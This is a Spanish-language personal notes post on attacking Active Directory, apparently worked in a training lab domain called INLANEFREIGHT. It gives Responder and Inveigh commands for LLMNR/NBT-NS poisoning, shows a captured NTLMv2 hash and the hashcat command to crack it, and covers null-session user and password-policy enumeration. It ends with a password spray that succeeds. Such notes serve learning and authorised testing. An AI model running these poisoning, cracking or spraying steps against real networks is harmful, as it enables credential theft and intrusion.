---
title: Active Directory
date: 2022-08-12 13:25:30 +/-TTTT
categories: [UTILITIES]
tags: []     # TAG names should always be lowercase
---
Primero se empíeza con la etapa de de reconocimiento pasivo usando herramientas como `nslookup` y registros públicos del dominio o ip que se nos asigne. Igualmente mediante `kerbrute` podmeos
obtener usuarios válidos, esta se considera una manera sigilosa de hacer reconocmiento activo, podemos usar `responder` para ver registros y obtener un dominio o información útil en la
interfaz de la máquina atacada.

```shell
sudo responder -i ens224
sudo tcpdump -i ens224
```
## Envenenamiento LLMNR/NBT-NS - desde Linux

Con responder podemos hacer un `M̀an in the middle` para poder obtener un hash LLMNR o NBT-NS e intentar crackearlo, 

```shell
ls /usr/share/responder/logs/
Analyzer-Session.log  Config-Responder.log  Poisoners-Session.log  Responder-Session.log  SMB-NTLMv2-SSP-172.16.5.130.txt

cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.130.txt 

clusteragent::INLANEFREIGHT:b5af06265941cd68:FF1CEDC4CD71040CB1A475DE7CDE9366:010100000000000000268C57B3E0D801DB1E7B1D53A0417D0000000002000800540046003500530001001E00570049004E002D004C0033004C0
05900350047005700370056004900540004003400570049004E002D004C0033004C00590035004700570037005600490054002E0054004600350053002E004C004F00430041004C000300140054004600350053002E004C004F00430041004C000500
140054004600350053002E004C004F00430041004C000700080000268C57B3E0D801060004000200000008003000300000000000000000000000003000007916A53455926B8EDB268D83802A5B83252E6A0886B3ACA4E0D39AE3BA912D170A001
000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

hashcat -a 0 -m 5600 hash3 /usr/share/Seclists/rockyou.txt
```

Una herramienta similar a responder pero a para windows seria `inveigh`, podemos importarlo mediante un módulo de powershell o directamente ejecutarlo en su versión compilada aunque esta ya no esté
actualizada.

```powershell
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
## Enumeración de usuarios

Mediante herramientas como `rpclient`, `smbclient`, `kerbrute` etc. podemos intentar conseguir información de usuario.

```shell
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
Total Groups:	0
Total Aliases:	37
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1
```
También podemos obtener la política de la contraseña mediante `rpclient` para disminuir la lista de contrasñeas a intentar.

```shell
getdompwinfo
min_password_length: 8
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX
```
Otra herramienta útil puede ser `enum4linux`, con esta podemos importar los resultado en formato JSON o YAML. Esta herramienta hace un reconomiento básico de los diferentes servicios
existentes.

```shell
enum4linux-ng -P 172.16.5.5 -oA ilfreight

ENUM4LINUX - next generation

<SNIP>

 =======================================
|    RPC Session Check on 172.16.5.5    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[-] Could not establish random user session: STATUS_LOGON_FAILURE
```
Con un enlace anónimo de LDAP, podemos usar herramientas de enumeración específicas de LDAP, como `windapseach.py`, `ldapsearch`, `ad-ldapdomaindump.py`, etc., para extraer la política de contraseñas. 
Con ldapsearch , puede ser un poco engorroso pero factible. 

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
modifiedCountAtLastProm: 0
nextRid: 1002
pwdProperties: 1
pwdHistoryLength: 24
```
Aquí podemos ver la longitud mínima de la contraseña de 8, el umbral de bloqueo de 5 y la complejidad de la contraseña establecida (pwdProperties stablecida en 1).

En windows podemos obtener esta política mediante `net.exe` o `powerview`

```powershell
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

```powershell
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```
Si estamos dentro de un entorno windows podemos hacer uso de `DomainPasswordSpray.ps1`

```powershell
PS C:\tools> Import-Module .\DomainPasswordSpray.ps1
PS C:\tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2940 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2940 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2940 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): y
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Winter2022 against 2940 users. Current time is 5:11 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:dbranch Password:Winter2022
```
